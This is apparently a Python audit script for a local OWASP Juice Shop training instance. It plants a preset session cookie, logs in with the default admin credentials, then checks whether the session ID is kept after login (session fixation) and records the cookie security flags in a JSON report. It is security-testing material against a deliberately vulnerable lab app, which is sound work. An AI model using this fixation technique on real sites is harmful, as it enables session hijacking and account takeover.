import requests, json, datetime, os
LOGIN = "http://localhost:3000/rest/user/login"
PAYLOAD = {"email": "admin@juice-sh.op", "password": "admin123"}
s = requests.Session()
s.cookies.set("connect.sid","ATTACKER_FIXATION_TOKEN")
s.post(LOGIN, json=PAYLOAD)
sid_after = s.cookies.get("connect.sid")
jar = [{"name":c.name,"secure":c.secure,"httponly":getattr(c,"rest",{}).get("HttpOnly",False),"samesite":getattr(c,"same_site",None)} for c in s.cookies]
report = {"pre_login_sid":"ATTACKER_FIXATION_TOKEN","post_login_sid":sid_after,"fixated":sid_after=="ATTACKER_FIXATION_TOKEN","cookies":jar,"timestamp":str(datetime.datetime.now())}
with open(os.path.join(os.getcwd(),"session_audit.json"),"w") as f:
    json.dump(report,f,indent=2)
print("Fixated?", report["fixated"])